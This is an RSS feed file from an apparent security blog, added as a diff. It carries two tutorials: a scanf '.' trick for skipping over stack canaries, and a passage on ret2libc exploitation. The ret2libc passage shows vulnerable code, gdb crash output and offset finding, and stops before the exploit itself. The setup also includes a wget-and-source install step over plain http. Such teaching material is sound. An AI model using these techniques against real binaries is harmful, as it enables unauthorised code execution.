@@ -1,0 +1,499 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>pwntools on REhex</title>
+    <link>/tags/pwntools/</link>
+    <description>Recent content in pwntools on REhex</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY 4.0&lt;/a&gt;</copyright>
+    <lastBuildDate>Thu, 10 Jun 2021 15:32:42 +0200</lastBuildDate><atom:link href="/tags/pwntools/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>pwn&gt; scanf and hateful dot</title>
+      <link>/posts/scanf-and-hateful-dot/</link>
+      <pubDate>Thu, 10 Jun 2021 15:32:42 +0200</pubDate>
+      
+      <guid>/posts/scanf-and-hateful-dot/</guid>
+      <description>&lt;p&gt;How to bypass the stack canary with &lt;code&gt;.&lt;/code&gt; (dot) and &lt;code&gt;scanf&lt;/code&gt;.&lt;/p&gt;</description>
+      <content>&lt;p&gt;How to bypass the stack canary with &lt;code&gt;.&lt;/code&gt; (dot) and &lt;code&gt;scanf&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;scenario&#34;&gt;Scenario&lt;/h2&gt;
+&lt;p&gt;Imagine that you have given binary implemented by following code (compiled with default settings):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;() {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How many numbers do you want to add?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+    scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;n);
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;n; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Number[%d]: &amp;#34;&lt;/span&gt;, i);
+        scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lf&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buffer[i]);
+        s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; buffer[i];
+    }
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your sum: %lf&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, s);
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+    sum();
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Above code obviously trusts user input and allows to overwrite arbritrary data which can be weaponized with &lt;a href=&#34;/posts/ret2libc.md&#34;&gt;ret2libc&lt;/a&gt; and lead to gaining the shell. But there is one big problem - stack canary:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;overwriting stack canary will cause exception&lt;/li&gt;
+&lt;li&gt;we can&amp;rsquo;t brute-force the stack cookie (program is not giving us such possibility)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-C0h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+14h] [rbp-BCh]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-B8h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-B0h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v5; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+C8h] [rbp-8h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
+  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0&lt;/span&gt;;
+  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How many numbers do you want to add?&amp;#34;&lt;/span&gt;);
+  scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v1);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v1; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
+  {
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Number[%d]: &amp;#34;&lt;/span&gt;, i);
+    scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lf&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v4[i]);
+    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v3;
+  }
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your sum: %lf&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, v3);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; v5;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;game-over-not-exactly-&#34;&gt;Game Over? Not exactly ;)&lt;/h2&gt;
+&lt;p&gt;Notice that user input is collected with &lt;code&gt;scanf(&amp;quot;%lf&amp;quot;, &amp;amp;buffer[i])&lt;/code&gt; and here is the trick: you can pass &lt;code&gt;.&lt;/code&gt; (dot) as input, which will &lt;em&gt;skip&lt;/em&gt; overwriting the data in referenced variable:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Number[20]: .
+Number[21]: .
+Your sum: -92773155265697924505313227519998636757689855298695787655081074157174089977436344947792687303154543628009248831613884078618796617025716224.000000
+[Inferior 1 (process 29710) exited normally]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;scanf-under-the-hood&#34;&gt;scanf under the hood&lt;/h2&gt;
+&lt;h3 id=&#34;what&#34;&gt;What&lt;/h3&gt;
+&lt;p&gt;First question which comes to mind after seeing this trick is &lt;em&gt;Why it happens&lt;/em&gt; - I will try to answer to this question in the next section - and &lt;em&gt;Is it working only for doubles?&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;I created a very simple test program which will help us understand the scope of this trick without reading the source:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; foo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3.7&lt;/span&gt;;
+        scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lf&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;foo);
+        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lf&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, foo);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;According to my test results:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;integer numbers (tested on &lt;code&gt;%d&lt;/code&gt;)
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;.&lt;/code&gt; and &lt;code&gt;.5&lt;/code&gt; don&amp;rsquo;t overwrite the data&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;floating point numbers (tested on &lt;code&gt;$d&lt;/code&gt;, &lt;code&gt;%lf&lt;/code&gt;)
+&lt;ul&gt;
+&lt;li&gt;only &lt;code&gt;.&lt;/code&gt; don&amp;rsquo;t overwrite the data&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;hexadecimal numbers
+&lt;ul&gt;
+&lt;li&gt;only &lt;code&gt;.&lt;/code&gt; don&amp;rsquo;t overwrite the data&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;strings (&lt;code&gt;%s&lt;/code&gt;)
+&lt;ul&gt;
+&lt;li&gt;data is always overwritten (as expected)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Summarizing our findings - it seems that &lt;code&gt;.&lt;/code&gt; affects all numeric string formats&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;why&#34;&gt;Why&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This part is partially based on the intuition, so it don&amp;rsquo;t have to be 100% accurate&lt;/p&gt;
+&lt;p&gt;Source Code can be found  [here]&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Keeping the long story short:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;in &lt;code&gt;_IO_vfscanf_internal&lt;/code&gt; all characters are checked and parsed one by one&lt;/li&gt;
+&lt;li&gt;legit characters are stored in &lt;code&gt;struct char_buffer charbuf;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;numeric values divided by &lt;code&gt;.&lt;/code&gt; are decomposed into separate values and then converted appropriately into the value of choosen type (&lt;strong&gt;ints&lt;/strong&gt;: only characters before  &lt;code&gt;.&lt;/code&gt; are parsed; &lt;strong&gt;floats&lt;/strong&gt;: everything before &lt;code&gt;.&lt;/code&gt; is interpreted as &lt;code&gt;0&lt;/code&gt; only if data is available behind the dot).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Scanf_format_string&#34;&gt;https://en.wikipedia.org/wiki/Scanf_format_string&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://git.launchpad.net/glibc/tree/stdio-common/vfscanf-internal.c&#34;&gt;https://git.launchpad.net/glibc/tree/stdio-common/vfscanf-internal.c&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;</content>
+    </item>
+    
+    <item>
+      <title>pwn&gt; ret2libc by example</title>
+      <link>/posts/ret2libc/</link>
+      <pubDate>Tue, 01 Jun 2021 12:32:42 +0200</pubDate>
+      
+      <guid>/posts/ret2libc/</guid>
+      <description>&lt;p&gt;How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp;amp; pwntools by example.&lt;/p&gt;</description>
+      <content>&lt;p&gt;How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp;amp; pwntools by example.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;NOTICE&lt;/strong&gt; I&amp;rsquo;m not very experienced in the &amp;ldquo;offensive RE&amp;rdquo; ~&amp;gt; pwns. If you will find some mistakes in my explainations, then please let me know in the comments :)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;exploitable (linux) binary&lt;/li&gt;
+&lt;li&gt;python3 + pwntools (I&amp;rsquo;m using it in virtualenv)&lt;/li&gt;
+&lt;li&gt;GDB + gef&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# quick install&lt;/span&gt;
+sudo apt install gdb python3 python3-pip
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# install gef (https://github.com/hugsy/gef)&lt;/span&gt;
+wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py
+echo source ~/.gdbinit-gef.py &amp;gt;&amp;gt; ~/.gdbinit
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# install pwntools in virtualenv (https://docs.pwntools.com/en/stable/)&lt;/span&gt;
+pip install virtualenv
+virtualenv -p python3 venv
+. ./venv/bin/activte
+pip install pwntools
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;My exploitable binary have following properties:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  checksec
+[+] checksec for &#39;binary&#39;
+Canary                        : ✘
+NX                            : ✓
+PIE                           : ✘
+Fortify                       : ✘
+RelRO                         : Full
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;hunt-for-the-exploitable-code&#34;&gt;Hunt for the exploitable code&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This tutorial will focus only on binaries with enabled relocation, it will fully ignore the PIE or stack canaries.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The easiest way to find the exploitable code is actually to play with the binary, learn about it&amp;rsquo;s background. It is worth noticing that exploitable functionality will be triggered from somewhere where binary interacts with the user (receive &amp;amp; parse packets, user input, configs)&lt;/p&gt;
+&lt;p&gt;In my case the binary have only 4 &amp;ldquo;input fields&amp;rdquo; and only one of them allows to overwrite the allocated buffer:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ida pseudo-code:
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fill&lt;/span&gt;()
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp-20h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  memset(buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf));
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much data do you want to store?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &amp;#34;&lt;/span&gt;)
+  read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400uLL&lt;/span&gt;);                       &lt;span style=&#34;color:#75715e&#34;&gt;// buffer can be overwritten
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Enjoy your %s&amp;#34;&lt;/span&gt;, buf);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;buf&lt;/code&gt; can handle only 32 bytes, but &lt;code&gt;read&lt;/code&gt; can read 400, so we should be to fully fill the buffer and overwrite the return address. Stack looks like that:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;+----------------+
+|  return addr   |   &amp;lt;- saved address of return when call fill was exeuted
++----------------+
+|   stored_rbp   |   &amp;lt;- saved RBP
++----------------+
+|                |
+|     buffer     |   &amp;lt;- local variables
+|                |
++----------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;ASM &lt;code&gt;call &amp;lt;func&amp;gt;&lt;/code&gt; is contained from the 2 instructions: &lt;code&gt;push $rip+1, jmp &amp;lt;func&amp;gt;&lt;/code&gt;, so it saves the address of the next instruction and performs jump to the called function.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ret&lt;/code&gt; is analogical, it consists of &lt;code&gt;pop&lt;/code&gt; &amp;amp; &lt;code&gt;jmp&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;prove-that-you-are-in-control&#34;&gt;Prove that you are in control&lt;/h2&gt;
+&lt;p&gt;Next natural step is to verify that we actually can control the &lt;code&gt;rip&lt;/code&gt; registry, the easiest way to achieve that is to run it in gdb with gef installed and generate the pattern:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern create 60
+[+] Generating a pattern of 60 bytes
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
+[+] Saved as &#39;$_gef0&#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Generated pattern is using readable characters which are containing unique set of characters which can be easily located in the string for identifying the offset of specified substring.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Then just use generated payload as input data in potentially vulnerable functionality. In my case I had to navigate to the proper menu and paste the payload as choice option. As result the program crashed and gdb handled the exception:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;&amp;gt; aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
+
+Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x49
+$rbx   : 0x0
+$rcx   : 0x0
+$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000
+$rsp   : 0x00007fffffffe278  →  &amp;quot;faaaaaaagaaaaaaahaaa\n&amp;quot;
+$rbp   : 0x6161616161616165 (&amp;quot;eaaaaaaa&amp;quot;?)
+$rsi   : 0x00007fffffffbbb0  →  &amp;quot;Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaa&amp;quot;
+$rdi   : 0x1
+$rip   : 0x0000000000400eec  →  &amp;lt;fill+162&amp;gt; ret
+$r8    : 0x49
+$r9    : 0x3d
+$r10   : 0xffffffc3
+$r11   : 0x246
+$r12   : 0x00000000004006e0  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+$r13   : 0x00007fffffffe370  →  0x0000000000000001
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe278│+0x0000: &amp;quot;faaaaaaagaaaaaaahaaa\n&amp;quot;     ← $rsp
+0x00007fffffffe280│+0x0008: &amp;quot;gaaaaaaahaaa\n&amp;quot;
+0x00007fffffffe288│+0x0010: 0x0000000a61616168 (&amp;quot;haaa\n&amp;quot;?)
+0x00007fffffffe290│+0x0018: 0x0000000000401040  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
+0x00007fffffffe298│+0x0020: 0x00007ffff7a05b97  →  &amp;lt;__libc_start_main+231&amp;gt; mov edi, eax
+0x00007fffffffe2a0│+0x0028: 0x0000000000000001
+0x00007fffffffe2a8│+0x0030: 0x00007fffffffe378  →  0x00007fffffffe5eb  →  &amp;quot;/tmp/binary&amp;quot;
+0x00007fffffffe2b0│+0x0038: 0x0000000100008000
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400ee5 &amp;lt;fill+155&amp;gt;       call   0x400670 &amp;lt;printf@plt&amp;gt;
+     0x400eea &amp;lt;fill+160&amp;gt;       nop
+     0x400eeb &amp;lt;fill+161&amp;gt;       leave
+ →   0x400eec &amp;lt;fill+162&amp;gt;       ret
+[!] Cannot disassemble from $PC
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &amp;quot;binary&amp;quot;, stopped 0x400eec in fill (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400eec → fill()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400eec in fill ()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bingo! Program crashed because it tried to jump &amp;amp; execute instructions under the invalid address. Now you can find the address which overwritten return pointer:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern offset $rsp
+[+] Searching &#39;$rsp&#39;
+[+] Found at offset 40 (little-endian search) likely
+[+] Found at offset 33 (big-endian search)
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;We can find the address in &lt;code&gt;rsp&lt;/code&gt;, because processor failed to execute &lt;code&gt;ret&lt;/code&gt; instruction. &lt;code&gt;rip&lt;/code&gt; still points to problematic instruction.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;As argument for &lt;em&gt;pattern offset&lt;/em&gt; you can also provide the string or hex number:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern offset faaaaaaagaaaaaaahaa
+[+] Searching &#39;faaaaaaagaaaaaaahaa&#39;
+[+] Found at offset 40 (big-endian search)
+
+gef➤  pattern offset 0x6161616161616166
+[+] Searching &#39;0x6161616161616166&#39;
+[+] Found at offset 40 (little-endian search) likely
+[+] Found at offset 33 (big-endian search)
+&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
+&lt;p&gt;Save the found offset (40 in my case), we will need it later.&lt;/p&gt;
+&lt;h2 id=&#34;develop-the-exploit-ret2libc&#34;&gt;Develop the exploit (ret2libc)&lt;/h2&gt;
